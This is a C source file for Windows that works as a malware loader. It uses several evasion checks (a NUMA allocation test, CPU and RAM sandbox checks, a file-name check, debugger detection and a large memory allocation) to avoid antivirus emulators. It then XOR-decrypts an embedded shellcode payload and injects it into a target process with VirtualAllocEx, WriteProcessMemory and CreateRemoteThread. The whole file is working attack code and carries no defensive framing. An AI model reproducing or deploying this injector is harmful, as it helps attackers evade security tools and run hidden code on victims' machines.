﻿#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <memoryapi.h>

typedef LPVOID(WINAPI* pVirtualAllocExNuma) (
    HANDLE         hProcess,
    LPVOID         lpAddress,
    SIZE_T         dwSize,
    DWORD          flAllocationType,
    DWORD          flProtect,
    DWORD          nndPreferred
    );

// memory allocation work on regular PC but will fail in AV emulators
BOOL checkNUMA() {
    LPVOID mem = NULL;
    pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocExNuma");
    mem = myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
    if (mem != NULL) {
        return false;
    }
    else {
        return true;
    }
}

// 反沙箱
BOOL checkResources() {
    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;
    DWORD procNum;
    DWORD ram;

    // 检测处理器核心数
    GetSystemInfo(&s);
    procNum = s.dwNumberOfProcessors;
    if (procNum < 2) return false;

    // 检测RAM，一般机器不会小于2G
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
    if (ram < 2) return false;

    return true;
}
unsigned char my_payload[] = { 0x91, 0x31, 0xf0, 0x91, 0x80, 0x8d, 0xb2, 0x73, 0x65, 0x63, 0x33, 0x34, 0x35, 0x3b, 0x37, 0x28, 0x3b, 0x31, 0x42, 0xa7, 0x15, 0x2d, 0xf9, 0x21, 0x5, 0x2b, 0xf9, 0x37, 0x6c, 0x23, 0xee, 0x2b, 0x4d, 0x31, 0xf8, 0x7, 0x20, 0x2d, 0x7d, 0xc4, 0x2f, 0x29, 0x3f, 0x54, 0xbd, 0x23, 0x54, 0xb9, 0xc1, 0x45, 0x12, 0x9, 0x72, 0x49, 0x52, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x87, 0x94, 0x3f, 0x38, 0x22, 0x3d, 0xfb, 0x37, 0x52, 0xf8, 0x27, 0x5f, 0x3a, 0x64, 0xa4, 0xe0, 0xe5, 0xf1, 0x6d, 0x79, 0x73, 0x3d, 0xf5, 0xa5, 0x6, 0x14, 0x2d, 0x62, 0xa2, 0x35, 0xff, 0x23, 0x7d, 0x3d, 0xe6, 0x39, 0x53, 0x3c, 0x71, 0xb5, 0x91, 0x25, 0x2d, 0x9c, 0xbb, 0x24, 0xff, 0x5f, 0xed, 0x31, 0x6c, 0xaf, 0x3e, 0x44, 0xb9, 0x2d, 0x43, 0xb3, 0xc9, 0x22, 0xb3, 0xac, 0x79, 0x2a, 0x64, 0xb8, 0x55, 0x99, 0x6, 0x84, 0x3c, 0x66, 0x3e, 0x57, 0x6d, 0x26, 0x4b, 0xb4, 0x1, 0xb3, 0x3d, 0x3d, 0xe6, 0x39, 0x57, 0x3c, 0x71, 0xb5, 0x14, 0x32, 0xee, 0x6f, 0x3a, 0x21, 0xff, 0x2b, 0x79, 0x30, 0x6c, 0xa9, 0x32, 0xfe, 0x74, 0xed, 0x3a, 0x72, 0xb5, 0x22, 0x2a, 0x24, 0x2c, 0x35, 0x3c, 0x23, 0x2c, 0x21, 0x32, 0x2c, 0x31, 0x3f, 0x3a, 0xf0, 0x89, 0x43, 0x33, 0x37, 0x8b, 0x8b, 0x3d, 0x38, 0x34, 0x23, 0x3b, 0xfe, 0x62, 0x8c, 0x25, 0x8c, 0x9a, 0x9c, 0x2f, 0x2d, 0xce, 0x6a, 0x65, 0x79, 0x6d, 0x79, 0x73, 0x75, 0x70, 0x2d, 0xff, 0xfe, 0x64, 0x62, 0x72, 0x65, 0x35, 0xd1, 0x54, 0xf2, 0x2, 0xfe, 0x8c, 0xa0, 0xcb, 0x95, 0xc7, 0xd1, 0x33, 0x22, 0xc8, 0xc3, 0xe1, 0xd6, 0xf8, 0x86, 0xb8, 0x31, 0xf0, 0xb1, 0x58, 0x59, 0x74, 0xf, 0x6f, 0xe3, 0x89, 0x85, 0x1, 0x6e, 0xde, 0x3e, 0x7e, 0xb, 0x1c, 0x1f, 0x70, 0x3c, 0x33, 0xfa, 0xbf, 0x9c, 0xa7, 0x6, 0x15, 0x7, 0x6, 0x57, 0x8, 0x1, 0x16, 0x75 };

unsigned int my_payload_len = sizeof(my_payload);

char my_secret_key[] = "mysupersecretkey";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main(int argc, char* argv[]) {

    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    PVOID rb; // remote buffer

    DWORD pid; // process ID
    pid = atoi(argv[1]);

    // 检测改名
    if (strstr(argv[0], "example.exe") == NULL) {
        printf("you changed my name:(\n");
        return -2;
    }

    // 检测调试器
    if (IsDebuggerPresent()) {
        printf("attached debugger detected :(\n");
        return -2;
    }

    // check NUMA
    if (checkNUMA()) {
        printf("NUMA memory allocate failed :( \n");
        return -2;
    }

    // 检查沙箱
    if (checkResources() == false) {
        printf("possibly launched in sandbox :(\n");
        return -2;
    }

    // 加大内存分配
    char* mem = NULL;
    mem = (char*)malloc(100000000);

    if (mem != NULL) {
        memset(mem, 00, 100000000);
        free(mem);

        ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
        printf("PID: %i", pid);
        XOR((char*)my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));
        rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL);

        rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
        CloseHandle(ph);
        return 0;
    }
}